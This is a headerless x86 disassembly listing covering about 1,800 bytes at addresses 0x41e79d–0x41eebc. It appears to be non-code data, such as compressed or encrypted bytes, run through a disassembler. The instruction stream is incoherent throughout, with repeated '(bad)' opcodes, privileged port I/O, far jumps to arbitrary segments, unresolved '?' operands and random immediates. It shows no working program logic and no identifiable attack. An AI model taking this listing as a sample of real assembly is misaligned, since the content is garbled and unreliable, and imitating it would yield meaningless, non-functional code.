  41e79d:	pop    ecx
  41e79e:	mov    BYTE PTR [ebx+0x3a8d1af4],cl
  41e7a4:	mov    al,bl
  41e7a6:	fmul   st(6),st
  41e7a8:	fild   WORD PTR [edx+0x280d3965]
  41e7ae:	cbw    
  41e7b0:	lock stc 
  41e7b2:	mov    edi,0x6b694cb1
  41e7b7:	push   esi
  41e7b8:	ret    0x66f2
  41e7bb:	and    cl,BYTE PTR [eax]
  41e7bd:	mov    al,cl
  41e7bf:	or     al,0xd9
  41e7c1:	mov    esi,0x4636c3ac
  41e7c6:	push   esp
  41e7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7c8:	adc    BYTE PTR [ebp+0x24],bh
  41e7cb:	stos   BYTE PTR es:[edi],al
  41e7cc:	pop    esp
  41e7cd:	cmp    dl,ah
  41e7cf:	mov    bl,0xf4
  41e7d1:	neg    ebx
  41e7d3:	push   es
  41e7d4:	loope  0x41e7fa
  41e7d6:	adc    ebx,ebp
  41e7d8:	les    esi,FWORD PTR [edi+0x1a]
  41e7db:	or     eax,DWORD PTR [eax+ebp*1]
  41e7de:	jae    0x41e823
  41e7e0:	mov    bl,0x6c
  41e7e2:	jbe    0x41e7e3
  41e7e4:	push   ebp
  41e7e5:	cwde   
  41e7e6:	mov    edx,0x7ca972c6
  41e7eb:	sar    BYTE PTR [edi+0x37aa44e8],cl
  41e7f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7f2:	fmul   DWORD PTR ds:0xbfa5615e
  41e7f8:	mov    WORD PTR [edi+0x79],cs
  41e7fb:	push   ecx
  41e7fc:	lock xlat BYTE PTR ds:[ebx]
  41e7fe:	sbb    BYTE PTR [ebp-0x5736d9f4],bl
  41e804:	test   dh,dl
  41e806:	pop    eax
  41e807:	popf   
  41e808:	leave  
  41e809:	(bad)  
  41e80a:	cdq    
  41e80b:	cli    
  41e80c:	adc    ecx,DWORD PTR [ecx*4+0x2ca39a09]
  41e813:	mov    edx,0x157aa802
  41e818:	xor    eax,0x6f4860b1
  41e81d:	or     BYTE PTR [edi+0x51],0xcc
  41e821:	lahf   
  41e822:	jne    0x41e7d7
  41e824:	ffreep st(4)
  41e826:	ret    0x7d64
  41e829:	push   edx
  41e82a:	pop    edi
  41e82b:	dec    eax
  41e82c:	in     eax,0x6a
  41e82e:	sbb    edi,DWORD PTR [ecx-0x4bbe6fe]
  41e834:	fisttp QWORD PTR [eax]
  41e836:	jle    0x41e80c
  41e838:	jnp    0x41e81c
  41e83a:	call   0x9554:0x74c07cfa
  41e841:	repz push edx
  41e843:	dec    edx
  41e844:	fs out dx,al
  41e846:	int3   
  41e847:	pop    ebx
  41e848:	xchg   esp,eax
  41e849:	mov    ebx,0x62799eea
  41e84e:	out    dx,eax
  41e84f:	stos   DWORD PTR es:[edi],eax
  41e850:	pushf  
  41e851:	xor    eax,0x8378555d
  41e856:	adc    ecx,DWORD PTR [edx]
  41e858:	test   DWORD PTR [ebx],ecx
  41e85a:	enter  0xb23b,0xa5
  41e85e:	aad    0x54
  41e860:	popa   
  41e861:	xchg   edi,eax
  41e862:	cld    
  41e863:	mov    esi,DWORD PTR [esi]
  41e865:	lods   al,BYTE PTR ds:[esi]
  41e866:	cmp    al,0x72
  41e868:	outs   dx,DWORD PTR ds:[esi]
  41e869:	dec    ecx
  41e86a:	(bad)  
  41e86b:	out    0x2,eax
  41e86d:	aas    
  41e86e:	push   ds
  41e86f:	jne    0x41e828
  41e871:	xchg   edx,eax
  41e872:	aad    0x24
  41e874:	(bad)  
  41e875:	hlt    
  41e876:	add    dh,BYTE PTR [esi-0x17]
  41e879:	fwait
  41e87a:	or     BYTE PTR [eax],bl
  41e87c:	popa   
  41e87d:	fldenv [ebp+edi*1+0x62767399]
  41e884:	inc    esp
  41e885:	add    eax,DWORD PTR ds:0xb755938f
  41e88b:	enter  0x5952,0x4a
  41e88f:	or     DWORD PTR [ecx],edi
  41e891:	jae    0x41e82a
  41e893:	call   0x773f:0xe14e2550
  41e89a:	ins    BYTE PTR es:[edi],dx
  41e89b:	js     0x41e8dd
  41e89d:	sahf   
  41e89e:	das    
  41e89f:	pop    edi
  41e8a0:	out    0xe2,eax
  41e8a2:	pop    ecx
  41e8a3:	add    edi,DWORD PTR [eax+0x49]
  41e8a6:	repnz mov ds,edi
  41e8a9:	aas    
  41e8aa:	mov    al,ds:0xdd604a84
  41e8af:	data16 ins BYTE PTR es:[edi],dx
  41e8b1:	add    bl,0x56
  41e8b4:	sti    
  41e8b5:	test   al,0xb4
  41e8b7:	cmp    eax,0x31e485d8
  41e8bc:	cmp    BYTE PTR [eax+ebp*2+0x40],0x61
  41e8c1:	lahf   
  41e8c2:	pop    ss
  41e8c3:	xchg   BYTE PTR [ecx],ch
  41e8c5:	push   eax
  41e8c6:	xchg   edx,eax
  41e8c7:	push   ebx
  41e8c8:	or     eax,0x5b2338bf
  41e8cd:	xchg   ebp,eax
  41e8ce:	or     BYTE PTR [ecx-0x78],dh
  41e8d1:	and    ebx,esp
  41e8d3:	sub    edi,0xffffff8f
  41e8d6:	sub    BYTE PTR gs:[ecx-0x14e810c8],dh
  41e8dd:	fcmovnb st,st(7)
  41e8df:	mov    esp,0xd7230eac
  41e8e4:	xchg   BYTE PTR ss:[edi-0x42],ch
  41e8e8:	sbb    eax,0x3e4ab1c7
  41e8ed:	ror    BYTE PTR [eax+0x92474d],1
  41e8f3:	push   ecx
  41e8f4:	pop    es
  41e8f5:	pop    edx
  41e8f6:	or     bp,ax
  41e8f9:	pop    es
  41e8fa:	shr    DWORD PTR ds:0x96c5cd06,1
  41e900:	dec    edx
  41e901:	(bad)  
  41e902:	push   ebp
  41e903:	enter  0x6d99,0xa3
  41e907:	int    0x53
  41e909:	outs   dx,DWORD PTR ds:[esi]
  41e90a:	sbb    esi,DWORD PTR [eax+0x6a]
  41e90d:	inc    esp
  41e90e:	sub    al,0xaa
  41e910:	mov    edi,0xf7283402
  41e915:	jbe    0x41e8c4
  41e917:	shr    edx,cl
  41e919:	aam    0xc5
  41e91b:	dec    ecx
  41e91c:	adc    esi,DWORD PTR [ebx-0x19]
  41e91f:	mov    bh,0xed
  41e921:	je     0x41e965
  41e923:	mov    cl,0x5b
  41e925:	xlat   BYTE PTR ds:[ebx]
  41e926:	dec    eax
  41e927:	inc    ebx
  41e928:	fs das 
  41e92a:	iret   
  41e92b:	sbb    edx,DWORD PTR [edi+ebx*4+0x45a61db8]
  41e932:	jmp    0x6912a3c0
  41e937:	test   al,0x73
  41e939:	adc    BYTE PTR [esi-0x40042eb1],ah
  41e93f:	ja     0x41e9ae
  41e941:	or     BYTE PTR [edx+0x371efd5e],bh
  41e947:	xor    eax,0x57cb1b38
  41e94c:	retf   
  41e94d:	ret    0xf38b
  41e950:	les    ecx,FWORD PTR [esi]
  41e952:	dec    BYTE PTR [ecx]
  41e954:	daa    
  41e955:	add    eax,0x3db5d892
  41e95a:	inc    edi
  41e95b:	xorps  xmm0,XMMWORD PTR [edi+edx*8+0x50]
  41e960:	iret   
  41e961:	dec    eax
  41e962:	outs   dx,DWORD PTR fs:[esi]
  41e964:	sub    DWORD PTR [edx],esi
  41e966:	or     ecx,eax
  41e968:	nop
  41e969:	and    al,cl
  41e96b:	and    al,0xfb
  41e96d:	or     DWORD PTR [ebx+0x13],esi
  41e970:	add    cl,BYTE PTR [eax]
  41e972:	ss mov dh,0xa6
  41e975:	fwait
  41e976:	idiv   BYTE PTR [esi-0x316b34e3]
  41e97c:	sbb    al,0x3d
  41e97e:	sub    eax,0xd19755d7
  41e983:	cli    
  41e984:	xor    ecx,DWORD PTR [eax]
  41e986:	hlt    
  41e987:	popf   
  41e988:	ds jae 0x41e9d7
  41e98b:	or     bl,dl
  41e98d:	dec    ecx
  41e98e:	or     eax,0x9428a38
  41e993:	cmp    BYTE PTR [eax-0x49],bl
  41e996:	jbe    0x41e9a5
  41e998:	test   eax,0x2edcf534
  41e99d:	push   ds
  41e99e:	inc    esi
  41e99f:	dec    edi
  41e9a0:	and    DWORD PTR [ecx],0xce69dea5
  41e9a6:	ins    DWORD PTR es:[edi],dx
  41e9a7:	ins    BYTE PTR es:[edi],dx
  41e9a8:	cwde   
  41e9a9:	jne    0x41e9f7
  41e9ab:	xor    DWORD PTR [ebx+0x220f46b],eax
  41e9b1:	add    esi,DWORD PTR [ecx-0x49]
  41e9b4:	dec    eax
  41e9b5:	cld    
  41e9b6:	rol    eax,1
  41e9b8:	sub    al,0xd8
  41e9ba:	mov    bl,bl
  41e9bc:	xchg   BYTE PTR [edx],al
  41e9be:	test   DWORD PTR [ecx+ecx*1],esi
  41e9c1:	adc    esp,DWORD PTR [esi+eiz*1]
  41e9c4:	adc    BYTE PTR [ebp+0x33],0x0
  41e9c8:	fild   WORD PTR fs:[esi+0x23ff33c9]
  41e9cf:	outs   dx,DWORD PTR ds:[esi]
  41e9d0:	push   es
  41e9d1:	sahf   
  41e9d2:	mov    edi,0xb6059a0
  41e9d7:	ss loopne 0x41e9eb
  41e9da:	xor    BYTE PTR [ecx-0x9629caa],bh
  41e9e0:	push   ecx
  41e9e1:	push   cs
  41e9e2:	xchg   ebx,eax
  41e9e3:	cdq    
  41e9e4:	fisub  DWORD PTR [edx+0x14]
  41e9e7:	dec    edx
  41e9e8:	adc    dh,dl
  41e9ea:	mov    eax,ds:0xd768c875
  41e9ef:	ins    BYTE PTR es:[edi],dx
  41e9f0:	arpl   WORD PTR [edi-0x7f],si
  41e9f3:	push   esi
  41e9f4:	outs   dx,BYTE PTR ds:[esi]
  41e9f5:	pop    ebp
  41e9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9f8:	xchg   esi,eax
  41e9f9:	dec    esi
  41e9fa:	mov    bl,0xd5
  41e9fc:	xor    eax,0x9f2e8bf2
  41ea01:	adc    ebx,DWORD PTR [edx-0x16951edc]
  41ea07:	daa    
  41ea08:	in     al,dx
  41ea09:	adc    dl,BYTE PTR ds:0xf73a4de2
  41ea0f:	test   al,0x74
  41ea11:	jbe    0x41ea00
  41ea13:	imul   esi,DWORD PTR [ecx+eiz*8+0x3c4b4f99],0x3f
  41ea1b:	pushf  
  41ea1c:	jmp    0x1d13:0x92453eaa
  41ea23:	xchg   ecx,eax
  41ea24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea25:	out    0xb,al
  41ea27:	push   es
  41ea28:	mov    edi,DWORD PTR [ebp+0x74]
  41ea2b:	aaa    
  41ea2c:	shl    DWORD PTR [eax-0x50],1
  41ea2f:	loopne 0x41ea6b
  41ea31:	leave  
  41ea32:	gs test edi,edx
  41ea35:	jmp    0xdcbb:0x6aa28052
  41ea3c:	and    DWORD PTR [ebp-0x2e],ebp
  41ea3f:	pusha  
  41ea40:	add    dl,BYTE PTR [edi+0x73]
  41ea43:	adc    al,0xd4
  41ea45:	dec    edx
  41ea46:	mov    dh,0x1
  41ea48:	cmp    eax,0xa111f1e
  41ea4d:	mov    cl,0xac
  41ea4f:	ja     0x41ea0d
  41ea51:	jnp    0x41ea25
  41ea53:	stos   DWORD PTR es:[edi],eax
  41ea54:	mov    bl,0xb3
  41ea56:	pushf  
  41ea57:	cli    
  41ea58:	stos   DWORD PTR es:[edi],eax
  41ea59:	inc    esi
  41ea5a:	sub    edi,DWORD PTR [ebp+0x34fede95]
  41ea60:	cmp    al,bh
  41ea62:	ror    BYTE PTR ds:0x78b49bd9,cl
  41ea68:	jg     0x41eadc
  41ea6a:	out    0x3e,al
  41ea6c:	adc    al,0x56
  41ea6e:	ret    
  41ea6f:	adc    eax,0x16c039d1
  41ea74:	mov    dl,0x10
  41ea76:	mov    edx,0xaf8f89f0
  41ea7b:	sbb    eax,0x96bb7d6d
  41ea80:	xchg   esi,eax
  41ea81:	inc    ebp
  41ea82:	pop    ss
  41ea83:	cli    
  41ea84:	dec    esi
  41ea85:	stos   BYTE PTR es:[edi],al
  41ea86:	push   0xffffff8a
  41ea88:	or     dh,BYTE PTR [ecx-0x58]
  41ea8b:	pop    ss
  41ea8c:	mov    cl,0x1c
  41ea8e:	into   
  41ea8f:	push   ebx
  41ea90:	inc    esp
  41ea91:	lea    edi,[ebx-0xd]
  41ea94:	test   al,0xc5
  41ea96:	aas    
  41ea97:	shl    BYTE PTR [ebx+esi*2+0x18],1
  41ea9b:	pop    ebp
  41ea9c:	adc    al,0x98
  41ea9e:	xchg   ecx,eax
  41ea9f:	mov    bh,dh
  41eaa1:	mov    dl,0xd8
  41eaa3:	sbb    DWORD PTR [edi-0x73],edi
  41eaa6:	mov    dh,BYTE PTR [ecx]
  41eaa8:	pop    esi
  41eaa9:	bound  ebp,QWORD PTR [edx+0x6e4fb787]
  41eaaf:	jmp    0x2f14:0xfe8b7d7a
  41eab6:	mov    ch,0x56
  41eab8:	push   ebx
  41eab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaba:	scas   al,BYTE PTR es:[edi]
  41eabb:	in     eax,0xe6
  41eabd:	lods   eax,DWORD PTR ds:[esi]
  41eabe:	pop    ebp
  41eabf:	(bad)  
  41eac0:	dec    ecx
  41eac1:	nop
  41eac2:	mov    edi,0x86f2c13c
  41eac7:	inc    edi
  41eac8:	inc    edx
  41eac9:	mov    edi,0x2b76e996
  41eace:	nop
  41eacf:	ja     0x41ea99
  41ead1:	inc    eax
  41ead2:	arpl   WORD PTR ds:0xe3cf2951,si
  41ead8:	jecxz  0x41eb39
  41eada:	and    BYTE PTR [eax],al
  41eadc:	out    0x8a,eax
  41eade:	call   0x7286f8ea
  41eae3:	jmp    0xb583:0x70bb123b
  41eaea:	add    eax,DWORD PTR [ebp-0x58]
  41eaed:	mov    ah,0xba
  41eaef:	mov    dh,BYTE PTR [ecx-0xe]
  41eaf2:	test   DWORD PTR [eax],esi
  41eaf4:	pop    ebp
  41eaf5:	std    
  41eaf6:	mov    ebx,ds
  41eaf8:	sti    
  41eaf9:	dec    ecx
  41eafa:	inc    eax
  41eafb:	sub    BYTE PTR [ebx-0x4b24abf2],0x34
  41eb02:	sbb    eax,0xf4d5df4c
  41eb07:	sub    DWORD PTR [edx],esi
  41eb09:	adc    ebp,eax
  41eb0b:	inc    eax
  41eb0c:	clc    
  41eb0d:	inc    ecx
  41eb0e:	jne    0x41eb48
  41eb10:	outs   dx,DWORD PTR ds:[esi]
  41eb11:	ror    BYTE PTR [ebx-0x34],0x50
  41eb15:	dec    edi
  41eb16:	jnp    0x41eb71
  41eb18:	sub    edx,ecx
  41eb1a:	data16 and BYTE PTR [esi],ch
  41eb1d:	dec    eax
  41eb1e:	cdq    
  41eb1f:	enter  0xd019,0x4a
  41eb23:	sbb    ah,BYTE PTR [edx-0x51]
  41eb26:	cmp    eax,0xb2f6466d
  41eb2b:	cmp    ecx,DWORD PTR [ecx]
  41eb2d:	fdiv   DWORD PTR [ebx-0x49]
  41eb30:	jbe    0x41eb6e
  41eb32:	jp     0x41eafa
  41eb34:	mov    cl,0xa2
  41eb36:	lock (bad) 
  41eb39:	in     al,dx
  41eb3a:	arpl   sp,ax
  41eb3c:	xchg   esi,eax
  41eb3d:	(bad)  
  41eb3e:	dec    ebp
  41eb3f:	dec    esi
  41eb40:	pop    ds
  41eb41:	test   al,0x79
  41eb43:	pslld  mm0,QWORD PTR [eax]
  41eb46:	aas    
  41eb47:	jg     0x41eb28
  41eb49:	dec    ebp
  41eb4a:	icebp  
  41eb4b:	adc    BYTE PTR [edi-0x6a],bh
  41eb4e:	and    ch,bh
  41eb50:	rcl    BYTE PTR [ecx+0x3b],1
  41eb53:	mov    WORD PTR [ebp-0x3c6bd094],?
  41eb59:	or     al,0x5
  41eb5b:	ror    BYTE PTR [edx],cl
  41eb5d:	in     al,0x9
  41eb5f:	out    dx,eax
  41eb60:	and    al,BYTE PTR [esi-0x504d3dc8]
  41eb66:	xor    eax,esi
  41eb68:	sbb    dh,BYTE PTR [ecx-0x7c512098]
  41eb6e:	push   es
  41eb6f:	xchg   ebx,eax
  41eb70:	xchg   ebx,eax
  41eb71:	xlat   BYTE PTR ds:[ebx]
  41eb72:	sar    BYTE PTR [edi],0x36
  41eb75:	out    0x74,eax
  41eb77:	push   ecx
  41eb78:	sti    
  41eb79:	push   esp
  41eb7a:	inc    ebx
  41eb7b:	or     esi,eax
  41eb7d:	stos   BYTE PTR es:[edi],al
  41eb7e:	ret    
  41eb7f:	mov    eax,ds:0xf691722c
  41eb84:	std    
  41eb85:	xor    bh,BYTE PTR [ecx+0x15]
  41eb88:	ja     0x41eb27
  41eb8a:	scas   eax,DWORD PTR es:[edi]
  41eb8b:	cmc    
  41eb8c:	int    0xcd
  41eb8e:	leave  
  41eb8f:	add    DWORD PTR [esi],0x4f
  41eb92:	paddsw mm4,QWORD PTR [eax-0x4a]
  41eb96:	cs push ds
  41eb98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb99:	test   ch,ch
  41eb9b:	out    0x5d,al
  41eb9d:	jns    0x41eb66
  41eb9f:	std    
  41eba0:	jae    0x41ebed
  41eba2:	dec    edi
  41eba3:	sete   BYTE PTR [eax-0x3e]
  41eba7:	xor    ecx,ecx
  41eba9:	not    BYTE PTR [edx]
  41ebab:	ins    DWORD PTR es:[edi],dx
  41ebac:	mov    ebx,0xa14f7c6e
  41ebb1:	jle    0x41eb41
  41ebb3:	or     BYTE PTR [eax+0x2b],0x23
  41ebb7:	es dec edx
  41ebb9:	inc    esi
  41ebba:	dec    edi
  41ebbb:	out    dx,eax
  41ebbc:	ficom  DWORD PTR [ecx-0x6e3bb0f8]
  41ebc2:	(bad)  [eax+0x9]
  41ebc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc6:	in     al,0x3c
  41ebc8:	mov    edx,0x80761b3
  41ebcd:	aaa    
  41ebce:	sub    BYTE PTR [esi-0x62],al
  41ebd1:	lock and ecx,DWORD PTR [ebp+0x1c]
  41ebd5:	aaa    
  41ebd6:	jae    0x41ebc7
  41ebd8:	lea    esi,[esi+0x5203f5c0]
  41ebde:	(bad)  
  41ebdf:	cld    
  41ebe0:	std    
  41ebe1:	add    DWORD PTR [ebx+0x1def192],edi
  41ebe7:	lahf   
  41ebe8:	cmp    esp,DWORD PTR [esi+0x778a523d]
  41ebee:	leave  
  41ebef:	stc    
  41ebf0:	push   DWORD PTR [edx]
  41ebf2:	cmp    al,0x84
  41ebf4:	xor    al,0xe5
  41ebf6:	pop    ebx
  41ebf7:	shl    DWORD PTR [eax-0x25243793],1
  41ebfd:	dec    esp
  41ebfe:	clc    
  41ebff:	loop   0x41ebb3
  41ec01:	jno    0x41ebfc
  41ec03:	xchg   ebx,eax
  41ec04:	or     al,0xb7
  41ec06:	xor    DWORD PTR [bx+si],ebx
  41ec09:	aad    0x2a
  41ec0b:	and    BYTE PTR [eax],cl
  41ec0d:	scas   eax,DWORD PTR es:[edi]
  41ec0e:	sar    DWORD PTR [eax-0x1],0xd1
  41ec12:	jl     0x41ec74
  41ec14:	in     eax,dx
  41ec15:	mov    al,0x87
  41ec17:	mov    al,ds:0x69527e2
  41ec1c:	and    al,0x31
  41ec1e:	push   es
  41ec1f:	add    DWORD PTR [edx],eax
  41ec21:	(bad)  
  41ec23:	mov    dl,0x25
  41ec25:	or     ebp,esi
  41ec27:	ret    
  41ec28:	xchg   esi,eax
  41ec29:	mov    cl,0xda
  41ec2b:	push   ebp
  41ec2c:	retf   0x87b
  41ec2f:	sbb    eax,0xed5af2d8
  41ec34:	dec    ebx
  41ec35:	fs xor ecx,edx
  41ec38:	fcom   QWORD PTR [edx]
  41ec3a:	mov    dl,0x19
  41ec3c:	sbb    BYTE PTR [esi-0x2f],ch
  41ec3f:	inc    edi
  41ec40:	jmp    0x41ec0c
  41ec42:	xor    eax,0xf39f53eb
  41ec47:	xchg   ecx,eax
  41ec48:	std    
  41ec49:	xor    bh,BYTE PTR [ecx]
  41ec4b:	xor    ah,BYTE PTR [ebx+0x20]
  41ec4e:	xor    ch,0x64
  41ec51:	cmp    cl,bh
  41ec53:	ficom  DWORD PTR [ebp+eax*8-0x35]
  41ec57:	scas   al,BYTE PTR es:[edi]
  41ec58:	(bad)  
  41ec59:	data16 cmp al,0xcb
  41ec5c:	jno    0x41ebee
  41ec5e:	fcom   DWORD PTR [edx+0x12e08a2d]
  41ec64:	inc    ebx
  41ec65:	into   
  41ec66:	xor    DWORD PTR [ebp+0x4a],esi
  41ec69:	lahf   
  41ec6a:	out    dx,eax
  41ec6b:	mov    esp,0x71339f20
  41ec70:	sub    eax,0x20497d58
  41ec75:	sub    esp,edx
  41ec77:	into   
  41ec78:	test   al,0x88
  41ec7a:	sbb    BYTE PTR [ecx+0x33],0x93
  41ec7e:	jnp    0x41ec76
  41ec80:	add    DWORD PTR [eax+eax*2+0x7],ecx
  41ec84:	stos   BYTE PTR es:[edi],al
  41ec85:	sbb    DWORD PTR [ebx-0x7d],esp
  41ec88:	leave  
  41ec89:	cmp    al,BYTE PTR [ebx]
  41ec8b:	xchg   ebx,eax
  41ec8c:	xchg   ecx,eax
  41ec8d:	mov    es,WORD PTR [edx-0x42]
  41ec90:	jns    0x41ed05
  41ec92:	int    0x18
  41ec94:	xor    al,0xe5
  41ec96:	jae    0x41ed12
  41ec98:	fiadd  DWORD PTR [edx-0x3b]
  41ec9b:	es adc al,0xf
  41ec9e:	mov    fs,edx
  41eca0:	sar    BYTE PTR cs:[edx-0x50],1
  41eca4:	test   eax,0xd6738ac2
  41eca9:	or     al,0x1e
  41ecac:	push   edx
  41ecad:	add    esi,esp
  41ecaf:	call   0x477cdcbb
  41ecb4:	push   ebx
  41ecb5:	sub    esp,edi
  41ecb7:	mov    bl,cl
  41ecb9:	dec    ebp
  41ecba:	cmp    DWORD PTR [ecx+0x1ce7c82f],edx
  41ecc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecc1:	and    eax,0xb0e217ef
  41ecc6:	or     eax,DWORD PTR [edx]
  41ecc8:	xchg   ecx,eax
  41ecc9:	jmp    0x20dd17c5
  41ecce:	sahf   
  41eccf:	sub    bl,cl
  41ecd1:	gs dec eax
  41ecd3:	mov    DWORD PTR [ebx],ebx
  41ecd5:	sub    al,0x6c
  41ecd7:	push   cs
  41ecd8:	imul   ebp,DWORD PTR [ebx+0x3d],0xd9204cef
  41ecdf:	sti    
  41ece0:	dec    esp
  41ece1:	(bad)  
  41ece2:	mov    bl,0x47
  41ece4:	ja     0x41ec78
  41ece6:	lods   eax,DWORD PTR ds:[esi]
  41ece7:	test   al,0x47
  41ece9:	jne    0x41ed26
  41eceb:	sbb    ah,BYTE PTR [edi+0x3593661c]
  41ecf1:	cmp    eax,DWORD PTR [eax+0x5540a2b8]
  41ecf7:	mov    edi,0x16181282
  41ecfc:	enterw 0x7aa0,0xd5
  41ed01:	ret    
  41ed02:	aam    0xa7
  41ed04:	fwait
  41ed05:	das    
  41ed06:	sahf   
  41ed07:	(bad)  
  41ed08:	mov    eax,0x75d77f52
  41ed0d:	pushf  
  41ed0e:	call   0x37e7:0xf891c9f6
  41ed15:	jnp    0x41eced
  41ed17:	icebp  
  41ed18:	jmp    0x5fc45b79
  41ed1d:	(bad)  [ebp+0x71]
  41ed20:	jle    0x41ed19
  41ed22:	xor    DWORD PTR [ecx],edi
  41ed24:	shl    BYTE PTR [edx+eax*1],cl
  41ed27:	(bad)
  41ed2b:	inc    edi
  41ed2c:	jae    0x41ed10
  41ed2e:	div    DWORD PTR [ecx-0x5f31d1db]
  41ed34:	aad    0x6b
  41ed36:	int3   
  41ed37:	push   ebx
  41ed38:	jmp    0x41ecf6
  41ed3a:	jbe    0x41ed5b
  41ed3c:	les    ebx,FWORD PTR [esp+ebp*2]
  41ed3f:	mov    eax,ds:0xa2de95a2
  41ed44:	xchg   WORD PTR [eax],ax
  41ed47:	jae    0x41ed34
  41ed49:	or     al,BYTE PTR [edx]
  41ed4b:	or     ch,BYTE PTR [ecx+0x184f400f]
  41ed51:	add    eax,0x3e0a4d74
  41ed56:	xchg   edx,eax
  41ed57:	iret   
  41ed58:	add    eax,0x4c93d42
  41ed5d:	push   esi
  41ed5e:	dec    esi
  41ed5f:	push   cs
  41ed60:	cmp    ebp,esi
  41ed62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed63:	int3   
  41ed64:	xor    BYTE PTR [ebp-0x5c7e580c],dl
  41ed6a:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41ed6c:	xor    eax,0x348767d8
  41ed71:	mov    ds:0x479753cc,eax
  41ed76:	and    DWORD PTR [ebp+0x0],edi
  41ed79:	hlt    
  41ed7a:	xor    al,0xca
  41ed7c:	lods   al,BYTE PTR ds:[esi]
  41ed7d:	jne    0x41edc1
  41ed7f:	scas   al,BYTE PTR es:[edi]
  41ed80:	jno    0x41ed86
  41ed82:	cld    
  41ed83:	push   0x30
  41ed85:	int3   
  41ed86:	js     0x41edb3
  41ed88:	jge    0x41edd6
  41ed8a:	icebp  
  41ed8b:	add    ecx,DWORD PTR [esp+edx*2]
  41ed8e:	stc    
  41ed8f:	adc    DWORD PTR [esi],ecx
  41ed91:	inc    edx
  41ed92:	aad    0xa1
  41ed94:	sbb    al,0x4f
  41ed96:	imul   ebp,DWORD PTR [ebx-0x2d7c593c],0x58
  41ed9d:	dec    ebp
  41ed9e:	js     0x41edcf
  41eda0:	imul   edx,DWORD PTR [edx+0x9],0x69
  41eda4:	dec    eax
  41eda5:	icebp  
  41eda6:	mov    bh,0x58
  41eda8:	enter  0x7fce,0x32
  41edac:	sub    DWORD PTR [edx-0x24],ebp
  41edaf:	test   DWORD PTR [ebx+0x4704b8a3],esp
  41edb5:	adc    esi,DWORD PTR [edx-0x6]
  41edb8:	neg    DWORD PTR [edi-0x3c]
  41edbb:	lahf   
  41edbc:	add    dl,ah
  41edbe:	pop    ds
  41edbf:	mov    edx,0x9ff15215
  41edc4:	or     esi,DWORD PTR [edi+0x1da78c57]
  41edca:	push   edi
  41edcb:	das    
  41edcc:	aam    0xca
  41edce:	or     dl,BYTE PTR [edx]
  41edd0:	(bad)  [ebp-0x5a]
  41edd3:	cld    
  41edd4:	push   edi
  41edd5:	cli    
  41edd6:	call   FWORD PTR [edi]
  41edd8:	pop    ebx
  41edd9:	lea    eax,[edi+eax*8-0x6a2772d6]
  41ede0:	mov    edx,0x7092aa1c
  41ede5:	(bad)  
  41ede6:	jmp    0x8200f94b
  41edeb:	add    esi,eax
  41eded:	xchg   edx,eax
  41edee:	mov    ss,WORD PTR [edx+0x8b058c5]
  41edf4:	inc    ebp
  41edf5:	leave  
  41edf6:	jge    0x41ed88
  41edf8:	jmp    0x4d87:0x3fa1926d
  41edff:	stc    
  41ee00:	dec    ecx
  41ee01:	dec    ecx
  41ee02:	arpl   WORD PTR [eax-0x25],bp
  41ee05:	jge    0x41ee37
  41ee07:	js     0x41ee18
  41ee09:	icebp  
  41ee0a:	xor    ebp,DWORD PTR [eax]
  41ee0c:	loop   0x41eda1
  41ee0e:	sahf   
  41ee0f:	clc    
  41ee10:	mov    ?,WORD PTR [ebp+esi*1+0x16]
  41ee14:	or     al,0xe4
  41ee16:	jle    0x41ee84
  41ee18:	fwait
  41ee19:	retf   
  41ee1a:	mov    ?,WORD PTR [eax-0x19]
  41ee1d:	out    0x81,eax
  41ee1f:	cli    
  41ee20:	popaw  
  41ee22:	mov    edx,esi
  41ee24:	fdivr  st(5),st
  41ee26:	xchg   ebx,eax
  41ee27:	mov    eax,ds:0x6a76a615
  41ee2c:	jb     0x41ee87
  41ee2e:	push   ebx
  41ee2f:	mov    eax,ds:0xc646dfa9
  41ee34:	into   
  41ee35:	cwde   
  41ee36:	sub    al,0x2f
  41ee38:	loopne 0x41ee7c
  41ee3a:	or     DWORD PTR [esi+0x16ba44e],ebp
  41ee40:	(bad)  
  41ee41:	mov    edi,ebx
  41ee43:	sahf   
  41ee44:	fist   DWORD PTR [esi+ebx*2+0x3f0fcc81]
  41ee4b:	xor    eax,0xcc056e67
  41ee50:	mov    al,0xdc
  41ee52:	(bad)  
  41ee53:	xchg   DWORD PTR [eax+0xf2c752],ebx
  41ee59:	mov    dh,0x4b
  41ee5b:	inc    esp
  41ee5c:	fcom   QWORD PTR [ebx-0x11a3d43b]
  41ee62:	ror    BYTE PTR [esi+edi*2],1
  41ee65:	shr    esi,1
  41ee67:	cmp    edi,edx
  41ee69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee6b:	loopne 0x41ee9e
  41ee6d:	repnz add DWORD PTR [ecx+0x23],edx
  41ee71:	adc    edi,edi
  41ee73:	push   0x1d2c8cc8
  41ee78:	into   
  41ee79:	mov    ds:0xa8574892,eax
  41ee7e:	sbb    edx,DWORD PTR [esi+0x4cd03444]
  41ee84:	mov    al,ds:0x9e1cfd6d
  41ee89:	test   al,0xb5
  41ee8b:	cmp    bh,ah
  41ee8d:	sbb    al,0x23
  41ee8f:	adc    DWORD PTR ds:0x88b3975c,eax
  41ee95:	mov    eax,0xee6e7e1f
  41ee9a:	retf   
  41ee9b:	dec    ecx
  41ee9c:	cs out dx,eax
  41ee9e:	bound  esi,QWORD PTR [esi]
  41eea0:	sbb    dl,ah
  41eea2:	mov    ebx,0xdbfdb6c8
  41eea7:	mov    ds:0x2e029c9b,al
  41eeac:	dec    DWORD PTR [ecx]
  41eeae:	adc    eax,0x52f5ad76
  41eeb3:	add    al,0xf0
  41eeb5:	pop    ebx
  41eeb6:	xchg   edi,eax
  41eeb7:	pop    esp
  41eeb8:	push   ds
  41eeb9:	sbb    BYTE PTR [esi],0x3b
  41eebc:	aaa    
